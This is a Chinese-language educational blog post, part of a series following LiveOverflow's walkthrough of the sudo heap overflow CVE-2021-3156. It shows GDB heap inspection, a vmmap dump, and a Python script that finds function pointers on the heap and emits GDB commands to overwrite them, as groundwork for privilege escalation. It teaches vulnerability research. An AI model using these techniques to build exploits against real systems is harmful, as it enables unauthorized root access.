<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | SUDO堆溢出提权：从fuzz到exp [3]</title><meta name="description" content="&lt;p&gt;前文：&lt;a href=&quot;https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/&quot;&gt;https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程&lt;/p&gt;
&lt;p&gt;原始视频合集：&lt;a href=&quot;https://www.youtube.com/watch?v=uj1FTiczJSE&amp;amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx&quot;&gt;https://www.youtube.com/watch?v=uj1FTiczJSE&amp;amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原始Blog：&lt;a href=&quot;https://liveoverflow.com/why-pick-sudo-research-target-part-1/&quot;&gt;https://liveoverflow.com/why-pick-sudo-research-target-part-1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原作者代码仓库：&lt;a href=&quot;https://github.com/LiveOverflow/pwnedit&quot;&gt;https://github.com/LiveOverflow/pwnedit&lt;/a&gt;&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">SUDO堆溢出提权：从fuzz到exp [3]</h3><div class="article__date metadata"><div class="post-info">2022/04/14</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/CVE/">CVE</a><a class="article__tags__link metadata" href="/tags/fuzz/">fuzz</a></div><div class="article__body"><p>前文：<a target="_blank" rel="noopener" href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</a></p>
<p>受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程</p>
<p>原始视频合集：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx">https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</a></p>
<p>原始Blog：<a target="_blank" rel="noopener" href="https://liveoverflow.com/why-pick-sudo-research-target-part-1/">https://liveoverflow.com/why-pick-sudo-research-target-part-1/</a></p>
<p>原作者代码仓库：<a target="_blank" rel="noopener" href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p>
<span id="more"></span>
<blockquote>
<p>My previous blog: <a target="_blank" rel="noopener" href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</a></p>
<p>I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series.</p>
<p>Original Videos: <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx">https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</a></p>
<p>Original Blog: <a target="_blank" rel="noopener" href="https://liveoverflow.com/why-pick-sudo-research-target-part-1/">https://liveoverflow.com/why-pick-sudo-research-target-part-1/</a></p>
<p>Source Project Code: <a target="_blank" rel="noopener" href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p>
</blockquote>
<hr />
<blockquote>
<p>本节内容：</p>
<p>Discussing Heap Exploit Strategies for sudo - Ep. 09</p>
<p>Developing a Tool to Find Function Pointers on The Heap | Ep. 10</p>
<p>Fuzzing Heap Layout to Overflow Function Pointers | Ep. 11</p>
<p>Developing GDB Extension for Heap Exploitation | Ep. 12</p>
</blockquote>
<h1 id="编写exp思路"><a class="markdownIt-Anchor" href="#编写exp思路"></a> 编写exp思路</h1>
<p>对于CTF中常见的堆思路是通过堆分配算法，使用<code>free</code>、<code>malloc</code>进行exp的编写，所以一般会出现一些菜单让你使用这些功能。<strong>本质上是攻击堆分配算法</strong></p>
<p>但是在漏洞利用中，只存在这一个堆溢出，我们无法进行系列的<code>free</code>、<code>malloc</code>，所以思路是能否攻击堆内的有效数据，尝试找到堆内的函数指针或者其他有用的数据。<strong>本质上是攻击堆上的数据</strong></p>
<h2 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试"></a> GDB调试</h2>
<p>不适用asan重新编译后，使用<strong>GEF</strong>分析crash时堆的分布</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/532a062a01ed40da463ddb63ede2b010.png" alt="image-20220414081956697" /></p>
<p>一个很明显的堆溢出，再看看出发时的堆分布</p>
<p>断点</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/977a9e1186a3d96c3b29ef7214e2f822.png" alt="image-20220414082506061" /></p>
<p>堆chunk</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/929d8e8804974a002194405514a80b0c.png" alt="image-20220414082234355" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/cf2f151144da211172788131fd8df6bb.png" alt="image-20220414082408083" /></p>
<p>再次到达断点，堆溢出</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7da088de496daf242ff6f08f51273c77.png" alt="image-20220414083507789" /></p>
<h2 id="困难与解决"><a class="markdownIt-Anchor" href="#困难与解决"></a> 困难与解决</h2>
<p>这样的堆分配情况让我们很难使用堆风水去调整堆分配，并且在程序运行中会遇到各种何样的内存分配情况，哪怕是不一样的长度都会造成堆分配的不同，进而让数据分配到不同的地方。</p>
<p>如何解决，有两个思路</p>
<ul>
<li>
<p>作者收到了<a target="_blank" rel="noopener" href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">原文报告</a>的启发，尝试编写小工具去“控制”堆</p>
<blockquote>
<p>To implement this initial technique, we wrote a rudimentary brute-forcer<br />
that executes Sudo inside gdb, overflows the “user_args” buffer, and<br />
randomly selects the following parameters:</p>
</blockquote>
</li>
<li>
<p>通过覆写其他堆中的函数指针来实现rce或者提权</p>
</li>
</ul>
<h1 id="函数指针工具编写"><a class="markdownIt-Anchor" href="#函数指针工具编写"></a> 函数指针工具编写</h1>
<h2 id="思路分析"><a class="markdownIt-Anchor" href="#思路分析"></a> 思路分析</h2>
<p>从gdb的<code>vmmap</code>指令我们知道程序有哪些代码段</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/aafecabf6b9432e4732b8135953de8fe.png" alt="image-20220414084942194" /></p>
<p>如果在堆内存中带有<code>x</code>即可执行权限的话就可能存在能够被我们利用的函数指针</p>
<h2 id="工具编写"><a class="markdownIt-Anchor" href="#工具编写"></a> 工具编写</h2>
<ol>
<li>
<p>写入但是没有溢出的情况下，在漏洞函数断点，dump内存</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dump binary memory /pwd/heap 0x005555555f9000 0x00555555637000</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>复制<code>vmmap</code>结果，尝试分析出有可执行权限的内存地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo</span><br><span class="line">0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]</span><br><span class="line">0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE</span><br><span class="line">0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]</span><br><span class="line">0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]</span><br><span class="line">0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-</span><br><span class="line">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>编写python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">vmmap=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]</span></span><br><span class="line"><span class="string">0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span></span><br><span class="line"><span class="string">0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE</span></span><br><span class="line"><span class="string">0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]</span></span><br><span class="line"><span class="string">0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]</span></span><br><span class="line"><span class="string">0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">memmap = []</span><br><span class="line"><span class="keyword">for</span> mem <span class="keyword">in</span> vmmap.splitlines():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;r-x&#x27;</span> <span class="keyword">in</span> mem:</span><br><span class="line">        start, end, size, perm, f = mem.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        start = <span class="built_in">int</span>(start, <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(end, <span class="number">16</span>)</span><br><span class="line">        memmap.append((start, end))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/pwd/heap&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    heap = f.read()</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(heap), <span class="number">8</span>):</span><br><span class="line">    heap_addr = i+<span class="number">0x005555555f9000</span></span><br><span class="line">    b = heap[i:i+<span class="number">8</span>]</span><br><span class="line">    q = struct.unpack(<span class="string">&#x27;Q&#x27;</span>, b)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mem <span class="keyword">in</span> memmap:</span><br><span class="line">        <span class="keyword">if</span> q&gt;=mem[<span class="number">0</span>] <span class="keyword">and</span> q&lt;=mem[<span class="number">1</span>]:</span><br><span class="line">            <span class="comment"># print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;set *0x<span class="subst">&#123;heap_addr:016x&#125;</span> = 0x&quot;</span>+(<span class="built_in">hex</span>(n)[<span class="number">2</span>:]*<span class="number">5</span>))</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x000055555561b4d0</span> == heap_addr:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;heap_addr:016x&#125;</span>: our [buffer]&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>得到结果</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/449bbaa76e8ed77743a08a0c31acb492.png" alt="image-20220414092034283" /></p>
